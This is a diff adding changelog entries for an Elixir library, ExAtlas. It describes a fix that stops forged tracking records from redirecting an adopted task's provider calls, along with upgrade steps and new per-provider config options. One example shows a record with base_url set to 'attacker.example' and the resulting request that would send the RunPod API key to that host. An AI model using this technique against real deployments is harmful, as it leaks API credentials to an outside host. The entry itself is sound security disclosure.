@@ -7,6 +7,42 @@ and ExAtlas adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html
 
 ## Unreleased
 
+### Fixed: a forged tracking record no longer steers an adopted task's calls (#125)
+
+Whoever could write the tracking store (the DETS file, or a row in your
+database with `TrackingStore.Ecto`) chose where an adopted task sent its
+provider calls, with the API key from your config.
+
+```elixir
+# a row in atlas_tracking_records
+%{id: "pod-1", provider: :runpod, opts: [base_url: "https://attacker.example"], ...}
+
+# next boot, the adopted task's status poll
+# before: GET https://attacker.example/pods/pod-1, Bearer <RUNPOD_API_KEY>
+# after:  GET <config :ex_atlas, :runpod, base_url:, else RunPod's URL>/pods/pod-1
+```
+
+- A record no longer stores `base_url:` or `req_options:`. An adopted task
+  takes both from config, and the first rewrite of an older record drops
+  them. The Adopter logs the keys of a record that held them, never the
+  values.
+- The Adopter adopts a record only when its provider is built in or a module
+  that declares `@behaviour ExAtlas.Provider`. Any other record is skipped,
+  kept, and logged, so the Reaper still leaves its pod alone.
+- **Upgrade:** if you pass `base_url:` or `req_options:` per call to a
+  `persist: true` spawn, set them in `config :ex_atlas, <provider>` before you
+  deploy. Otherwise a task adopted after the deploy calls the provider's
+  public URL. A fresh spawn still uses its per-call values. A custom provider
+  module adds `@behaviour ExAtlas.Provider` to keep its tasks adopted.
+
+### Added: `base_url:` and `req_options:` in every provider's config (#125)
+
+`ExAtlas.Config.build_ctx/2` reads `config :ex_atlas, <provider>, base_url:,
+req_options:` for a call that passes none, as it reads `api_key:`. Per-call
+`req_options` merge over the configured ones key by key, and a credential in
+either is sealed. RunPod gains a configured `base_url:` (the management API,
+as a per-call one); Lambda Labs and Vast read theirs as before.
+
 ### Fixed: `Compute.raw` no longer holds a RunPod pod's `env` (#126)
 
 RunPod echoes a pod's `env` (its bearer token, the callback token and the
